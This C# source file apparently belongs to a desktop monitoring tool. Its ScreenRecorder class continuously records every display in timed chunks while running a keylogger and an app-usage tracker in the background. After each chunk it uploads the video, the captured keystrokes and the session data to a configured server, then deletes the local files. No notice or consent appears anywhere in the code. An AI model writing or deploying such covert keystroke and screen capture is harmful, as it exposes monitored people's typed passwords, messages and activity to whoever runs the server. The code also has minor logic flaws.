﻿using Newtonsoft.Json;
using ScreenRecorderLib;
using ScreenTask;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows;
using System.Windows.Media.Animation;
using System.Windows.Media.Media3D;

namespace AppRealtime
{
    public class ScreenRecorder
    {
        private readonly AppSettings _appSettings;
        private readonly Recorder _rec;

        public ScreenRecorder(AppSettings appSettings)
        {
            _appSettings = appSettings;

            var sources = new List<RecordingSourceBase>();
            sources.AddRange(Recorder.GetDisplays());
            var outputOptions = new OutputOptions
            {
                RecorderMode = RecorderMode.Video,
                //This sets a custom size of the video output, in pixels.
                OutputFrameSize = new ScreenSize(_appSettings.FrameWidth, _appSettings.FrameHeight),
                //Stretch controls how the resizing is done, if the new aspect ratio differs.
                Stretch = StretchMode.Uniform,
            };

            RecorderOptions options = new RecorderOptions
            {
                SourceOptions = new SourceOptions
                {
                    RecordingSources = sources
                },
                OutputOptions = outputOptions,
            };

            _rec = Recorder.CreateRecorder(options);
            _rec.OnRecordingFailed += _rec_OnRecordingFailed;
        }

        private void _rec_OnRecordingFailed(object sender, RecordingFailedEventArgs e)
        {
            Log(e.Error.ToString());
        }

        public async Task RunAsync()
        {
            _ = Task.Run(() =>
            {

                KeyLogger.Run();

            });

            _ = Task.Run(() =>
            {

                _ = AppTimeTrack.Run();

            });

            while (true)
            {
                try
                {
                    int maxVideoSeconds = (int)TimeSpan.FromSeconds(_appSettings.VideoDuration).TotalMilliseconds;
                    string videoFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Videos");
                    if (!Directory.Exists(videoFolder))
                    {
                        Directory.CreateDirectory(videoFolder);
                    }
                    var now = ServerTimeHelper.GetUnixTimeSeconds();

                    KeyLogger.WriteNewLogSession(now);
                    AppTimeTrack.SetNewAppTrack(now);

                    string fileName = $"{now}_{now + maxVideoSeconds}.mp4";
                    string videoPath = Path.Combine(videoFolder, fileName);

                    Console.WriteLine("Record:" + videoPath);

                    _rec.Record(videoPath);

                    await Task.Delay(maxVideoSeconds);

                    _rec.Stop();

                    await WaitUntil(() => _rec.Status == RecorderStatus.Idle);
                    var keyLogJsonPath = videoPath.Replace(".mp4", "_UserAction.json");
                    var appsJsonPath = videoPath.Replace(".mp4", "_UserSession.json");

                    _ = Task.Run(async () =>
                    {
                        try
                        {
                            var keylog = new List<KeyLog>();
                            var log = KeyLogger.KeyLogs.First(k => k.Id == now);
                            if (log != null)
                            {
                                keylog = log.KeyLogCollection;
                            }

                            var appTimes = new List<AppTime>();
                            var appTime = AppTimeTrack.AppTimes.First(k => k.Id == now);
                            if (appTime != null)
                            {
                                appTimes = appTime.Collection;
                            }

                            foreach (var app in appTimes)
                            {
                                if (app.EndTime == 0)
                                {
                                    app.EndTime = ServerTimeHelper.GetUnixTimeSeconds();
                                }
                            }

                            var appsJson = JsonConvert.SerializeObject(appTimes);
                            File.WriteAllText(appsJsonPath, appsJson);
                            var keyLogJson = JsonConvert.SerializeObject(keylog);
                            File.WriteAllText(keyLogJsonPath, keyLogJson);

                            const int MAX_RETRIES = 5;
                            for (int i = 0; i < MAX_RETRIES; i++)
                            {
                                if (i >= MAX_RETRIES)
                                {
                                    break;
                                }

                                try
                                {
                                    var client = new HttpClient();
                                    var request = new HttpRequestMessage(HttpMethod.Post, _appSettings.VideoHost);
                                    request.Headers.Add("accept", "*/*");
                                    var content = new MultipartFormDataContent();
                                    content.Add(new StreamContent(File.OpenRead(videoPath)), "Video", Path.GetFileName(videoPath));
                                    content.Add(new StreamContent(File.OpenRead(keyLogJsonPath)), "UserAction", Path.GetFileName(keyLogJsonPath));
                                    content.Add(new StreamContent(File.OpenRead(appsJsonPath)), "UserSession", Path.GetFileName(appsJsonPath));
                                    content.Add(new StringContent(Globals.UUID), "token");
                                    request.Content = content;
                                    var response = await client.SendAsync(request);
                                    response.EnsureSuccessStatusCode();
                                    string result = await response.Content.ReadAsStringAsync();
                                    if (result.Contains("successfully"))
                                    {
                                        Console.WriteLine("Video uploaded successfully");
                                        break;
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Log(ex.ToString());
                                }
                            }
                        }
                        finally
                        {
                            File.Delete(videoPath);
                            File.Delete(keyLogJsonPath);
                            File.Delete(appsJsonPath);
                        }
                    });
                }
                catch (Exception ex)
                {
                    Log(ex.ToString());
                }
            }
        }

        public void Stop()
        {
            try
            {
                if (_rec != null)
                {
                    _rec.Stop();
                }
            }
            catch (Exception ex) { Log(ex.ToString()); }
        }

        /// <summary>
        /// Blocks until condition is true or timeout occurs.
        /// </summary>
        /// <param name="condition">The break condition.</param>
        /// <param name="frequency">The frequency at which the condition will be checked.</param>
        /// <param name="timeout">The timeout in milliseconds.</param>
        /// <returns></returns>
        private static async Task WaitUntil(Func<bool> condition, int frequency = 25, int timeout = -1)
        {
            var waitTask = Task.Run(async () =>
            {
                while (!condition()) await Task.Delay(frequency);
            });

            if (waitTask != await Task.WhenAny(waitTask,
                    Task.Delay(timeout)))
                throw new TimeoutException();
        }
        private static void Log(string text)
        {
            Console.WriteLine(DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + " : " + text);
            Trace.WriteLine(text);
        }
    }
}
